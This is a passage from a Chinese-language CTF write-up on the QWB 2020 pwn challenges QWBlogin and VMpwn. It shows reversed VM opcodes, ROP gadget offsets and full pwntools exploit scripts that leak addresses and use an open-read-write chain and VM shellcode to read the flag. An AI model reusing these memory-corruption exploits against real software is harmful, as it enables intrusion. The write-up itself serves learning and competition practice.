class="hljs-built_in">r3</span>, <span class="hljs-built_in">r0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">r4</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> r16, r17      <span class="hljs-keyword">pop</span> <span class="hljs-built_in">qword</span> r17<span class="hljs-keyword">ret</span></code></pre><p>于是程序就比较清晰了，如果输入了<code>password</code>为<code>QWQG00DR3VRW31LD0N3Try2Pwn!GOGOGOGO</code>就能走到最后溢出的地方</p><p>最后在<code>read(0, stack, 0x800)</code>的地方会出现溢出，然后在<code>ret</code>的时候把栈上的内容<code>pop</code>到<code>vm.pc</code>，于是就需要在<code>test.bin</code>里面找到可以用<code>gadgets</code></p><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><h4 id="gadgets"><a href="#gadgets" class="headerlink" title="gadgets"></a>gadgets</h4><p>在程序<code>RET</code>之后还有一大段无关的<code>opcode</code>，做到这步的时候才知道，这些就是为了凑<code>gadgets</code>的</p><p>其中标记为<code>R</code>的是不需要限制的</p><pre><code class="hljs python"><span class="hljs-comment"># 0x0d 0xR6 0x00 0x11 0xRR</span>pop_r00_ret = <span class="hljs-number">0x2f5</span>         <span class="hljs-comment"># 0x46</span><span class="hljs-comment"># 0x0d 0xR6 0x01 0X11 0xRR</span>pop_r01_ret = <span class="hljs-number">0x377</span>         <span class="hljs-comment"># 0x46</span><span class="hljs-comment"># 0x0d 0xR6 0x02 0x11 0xRR</span>pop_r02_ret = <span class="hljs-number">0x45c</span>         <span class="hljs-comment"># 0x46</span><span class="hljs-comment"># 0x0d 0xR6 0x03 0x11 0xRR</span>pop_r03_ret = <span class="hljs-number">0x4e1</span>         <span class="hljs-comment"># 0x46</span><span class="hljs-comment"># 0x20 0x0a 0x11 0xRR</span>sys_open_ret = <span class="hljs-number">0x6ed</span><span class="hljs-comment"># 0x20 0xR8 0x11 0xRR</span>sys_data_ret = <span class="hljs-number">0x5b1</span><span class="hljs-comment"># 0x20 0xR9 0x11 0xRR</span>sys_stack_ret = <span class="hljs-number">0x617</span></code></pre><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>由于<code>syscall</code>中只有<code>open | read | write | close</code>可用，很自然想到<code>orw</code>，然后构造<code>rop</code>链就行了，其中由于最开始打开了<code>test.bin</code>文件，所以<code>fd=4</code>，最初写<code>exp</code>的时候被坑了一下，以及调试的时候希望能有结构体的符号，我编译了<code>struct.c =&gt; struct.o</code>再在调试的时候<code>add-symbol-file struct.o 0</code>即可</p><pre><code class="hljs python">payload = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x108</span><span class="hljs-comment"># read(0, data[0x100], 0x20)</span><span class="hljs-comment"># r00 = 1 r01 = 0 r02 = 0x100 r03 = 0x20</span>payload += p64(pop_r00_ret) + p64(<span class="hljs-number">1</span>) + p64(pop_r01_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_r02_ret) + p64(<span class="hljs-number">0x100</span>) + p64(pop_r03_ret) + p64(<span class="hljs-number">0x20</span>)payload += p64(sys_data_ret)<span class="hljs-comment"># open(data[0x100], 0)</span><span class="hljs-comment"># r00 = 0 r01 = 0x200 r02 = 0</span>payload += p64(pop_r00_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_r01_ret) + p64(<span class="hljs-number">0x100</span>) + p64(pop_r02_ret) + p64(<span class="hljs-number">0</span>)payload += p64(sys_open_ret)<span class="hljs-comment"># read(4, data[0x100], 0x30)</span><span class="hljs-comment"># r00 = 1 r01 = 4 r02 = 0x100 r03 = 0x30</span>payload += p64(pop_r00_ret) + p64(<span class="hljs-number">1</span>) + p64(pop_r01_ret) + p64(<span class="hljs-number">0x4</span>) + p64(pop_r02_ret) + p64(<span class="hljs-number">0x100</span>) + p64(pop_r03_ret) + p64(<span class="hljs-number">0x30</span>)payload += p64(sys_data_ret)<span class="hljs-comment"># write(1, data[0x100], 0x30)</span><span class="hljs-comment"># r00 = 2 r01 = 1 r02 = 0x100 r03 = 0x30</span>payload += p64(pop_r00_ret) + p64(<span class="hljs-number">2</span>) + p64(pop_r01_ret) + p64(<span class="hljs-number">0x1</span>) + p64(pop_r02_ret) + p64(<span class="hljs-number">0x100</span>) + p64(pop_r03_ret) + p64(<span class="hljs-number">0x30</span>)payload += p64(sys_data_ret)</code></pre><p>强的大佬，不需要<code>instruction.h</code>都能在5个小时内做出来，而我就是只菜鸡</p><p><a href="https://github.com/Vang3lis/CTF_repo/tree/master/QWB_2020/QWBlogin">QWBlogin 题目</a></p><h2 id="VMpwn"><a href="#VMpwn" class="headerlink" title="VMpwn"></a>VMpwn</h2><p>这个题目跟上一个题目一样先逆向，但是这个题目跟<code>QWBlogin</code>相比实现<code>vm</code>的时候简单一些</p><p>其中有一个 <code>chunk 0x30</code>用来记录寄存器的值<code>vm[0] vm[1] vm[2]</code> 类似<code>rdi, rsi, rdx</code>在<code>syscall</code>时会用到，<code>vm[3]</code>为<code>sp</code>，<code>vm[5]</code>为 <code>pc</code></p><p>在最后的关键操作为对于<code>read(0, stack, 0x1000)</code>（栈只有<code>0x100</code>个字节）</p><pre><code class="hljs assembly">pwndbg&gt; distance 0x555555759050 0x55555575ad680x555555759050-&gt;0x55555575ad68 is 0x1d18 bytes (0x3a3 words) RAX  0x7ffff7b156c0 (read) ◂— cmp    dword ptr [rip + 0x2c3039], 0 ► 0x5555555555db    call   rax &lt;0x7ffff7b156c0&gt;        fd: 0x0        buf: 0x55555575ad68 ◂— 0x0        nbytes: 0x1000pwndbg&gt; telescope 0x55555575801000:0000│   0x555555758010 ◂— 0x001:0008│   0x555555758018 —▸ 0x55555575ad68 ◂— 0x002:0010│   0x555555758020 ◂— 0x100003:0018│   0x555555758028 —▸ 0x55555575ad68 ◂— 0x004:0020│   0x555555758030 ◂— 0x005:0028│   0x555555758038 —▸ 0x5555557572d6 ◂— 0x772c6b6f11028f10</code></pre><p>然后<code>puts(stack)</code>，可以看到该虚拟栈上有<code>heap</code>地址和<code>elf</code>地址，但是只能泄漏一个</p><pre><code class="hljs assembly">pwndbg&gt; telescope 0x55555575ad68 0x3000:0000│ rsi  0x55555575ad68 ◂— &#39;1234454636\n&#39;01:0008│      0x55555575ad70 ◂— 0xa3633 &#x2F;* &#39;36\n&#39; *&#x2F;02:0010│      0x55555575ad78 ◂— 0x0... ↓1e:00f0│      0x55555575ae58 —▸ 0x555555758050 ◂— 0x20746168772c6b6f (&#39;ok,what &#39;)1f:00f8│      0x55555575ae60 ◂— 0x020:0100│      0x55555575ae68 —▸ 0x555555757851 ◂— 0xff</code></pre><p>接下来同第一步的<code>read(0, stack, 0x1000)</code> <code>write(0, stack, 0x20)</code>然后<code>ret</code></p><p>这个程序中有一个两个比较奇怪的地方，由于<code>ret</code>的时候程序的实现，是将<code>sp-=8</code>，但是<code>PUSH</code>为<code>sp-=8</code> <code>POP</code>为<code>sp+=8</code>，因此<code>ret</code>的时候比较奇怪，另外就是与<code>QWBlogin</code>相比没有 什么能用的<code>gadget</code>，因此想法只能为按照<code>vm</code>的规则，写<code>shellocde</code>，然后在最后<code>ret</code>的时候跳转过去，但是该题用 <code>seccomp</code>限制了只能 <code>orw</code>，且没有给<code>open</code>的 <code>syscall</code>只能泄漏</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>因此思路就是，先利用<code>puts</code>泄漏<code>elf</code>的地址，然后再<code>ret</code>到最初<code>elf_code+0x3</code>然后再泄漏<code>heap</code>，<code>ret</code>到写入栈上的<code>shellcode</code></p><p>利用<code>puts</code>泄漏<code>libc</code>，然后再次输入到栈上，利用<code>\x6d: mov reg[0], 0</code>作为<code>nop</code>，编写<code>shellcode</code></p><p>然后将<code>open</code>写入<code>free</code>的位置，因此在调用<code>syscall 03</code>时就是调用<code>open</code>，最后利用<code>orw</code>进行读取<code>flag</code></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="hljs python"><span class="hljs-comment"># heap+0x2e68 =&gt; elf_bss</span>io.sendafter(<span class="hljs-string">&quot;name:&quot;</span>, <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0xff</span>+<span class="hljs-string">&quot;#&quot;</span>)io.recvuntil(<span class="hljs-string">&quot;#&quot;</span>)elf.address = u64(io.recvn(<span class="hljs-number">6</span>) + <span class="hljs-string">&quot;\x00\x00&quot;</span>) - <span class="hljs-number">0x203851</span>success(<span class="hljs-string">&quot;elf&quot;</span>, elf.address)<span class="hljs-comment"># 0xf8 + ret </span>io.sendafter(<span class="hljs-string">&quot;say:&quot;</span>, <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0x100</span> + p64(elf.address + <span class="hljs-number">0x203023</span>))io.sendafter(<span class="hljs-string">&quot;name:&quot;</span>, <span class="hljs-string">&quot;\x50&quot;</span>)heap = u64(io.recvn(<span class="hljs-number">6</span>) + <span class="hljs-string">&quot;\x00\x00&quot;</span>) - <span class="hljs-number">0x50</span>success(<span class="hljs-string">&quot;heap&quot;</span>, heap)<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">mov reg[0], read_got</span><span class="hljs-string">puts</span><span class="hljs-string">mov reg[0], 0</span><span class="hljs-string">mov reg[1], heap + addr</span><span class="hljs-string">mov reg[2], 0x1000</span><span class="hljs-string">read        </span><span class="hljs-string">//  use 0x6d: mov reg[0], 0 as nop</span><span class="hljs-string">&#x27;&#x27;&#x27;</span>payload = <span class="hljs-string">&quot;\x11&quot;</span> + p64(elf.got[<span class="hljs-string">&#x27;read&#x27;</span>])payload += <span class="hljs-string">&quot;\x8f\x02&quot;</span>payload += <span class="hljs-string">&quot;\x6d&quot;</span>payload += <span class="hljs-string">&quot;\x12&quot;</span> + p64(heap+<span class="hljs-number">0x2d60</span>)payload += <span class="hljs-string">&quot;\x13&quot;</span> + p64(<span class="hljs-number">0x1000</span>)payload += <span class="hljs-string">&quot;\x8f\x00&quot;</span>payload = payload.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;A&quot;</span>)payload += p64(heap+<span class="hljs-number">0x2d60</span>)io.sendafter(<span class="hljs-string">&quot;say:&quot;</span>, payload)io.recvuntil(<span class="hljs-string">&quot;bye~\n&quot;</span>)libc.address = u64(io.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>, drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;\x00&quot;</span>)) - libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">flag</span><span class="hljs-string">0x6d * 0x50</span><span class="hljs-string">mov reg[1], elf.address+0x203900</span><span class="hljs-string">mov reg[2], 8</span><span class="hljs-string">read</span><span class="hljs-string">mov reg[0], heap+0x2d60</span><span class="hljs-string">mov reg[1], 0</span><span class="hljs-string">open</span><span class="hljs-string">mov reg[0], 3</span><span class="hljs-string">mov reg[1], bss</span><span class="hljs-string">mov reg[2], 0x30</span><span class="hljs-string">read</span><span class="hljs-string">mov reg[0], 1</span><span class="hljs-string">mov reg[1], bss</span><span class="hljs-string">mov reg[2], 0x30</span><span class="hljs-string">write</span><span class="hljs-string">&#x27;&#x27;&#x27;</span>payload = <span class="hljs-string">&quot;flag\x00&quot;</span>payload = payload.ljust(<span class="hljs-number">0x50</span>, <span class="hljs-string">&quot;\x6d&quot;</span>)payload += <span class="hljs-string">&quot;\x12&quot;</span> + p64(elf.address+<span class="hljs-number">0x2038f8</span>)payload += <span class="hljs-string">&quot;\x13&quot;</span> + p64(<span class="hljs-number">8</span>)payload += <span class="hljs-string">&quot;\x8f\x00&quot;</span>payload += <span class="hljs-string">&quot;\x11&quot;</span> + p64(heap+<span class="hljs-number">0x2d60</span>)payload += <span class="hljs-string">&quot;\x6e&quot;</span>payload += <span class="hljs-string">&quot;\x8f\x03&quot;</span>payload += <span class="hljs-string">&quot;\x11&quot;</span> + p64(<span class="hljs-number">3</span>)payload += <span class="hljs-string">&quot;\x12&quot;</span> + p64(elf.bss()+<span class="hljs-number">0x400</span>)payload += <span class="hljs-string">&quot;\x13&quot;</span> + p64(<span class="hljs-number">0x30</span>)payload += <span class="hljs-string">&quot;\x8f\x00&quot;</span>payload += <span class="hljs-string">&quot;\x11&quot;</span> + p64(<span class="hljs-number">1</span>)payload += <span class="hljs-string">&quot;\x12&quot;</span> + p64(elf.bss()+<span class="hljs-number">0x400</span>)payload += <span class="hljs-string">&quot;\x13&quot;</span> + p64(<span class="hljs-number">0x30</span>)payload += <span class="hljs-string">&quot;\x8f\x01&quot;</span>io.send(payload)sleep(<span class="hljs-number">0.03</span>)io.send(p64(libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]))io.interactive()io.close()</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>vm</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
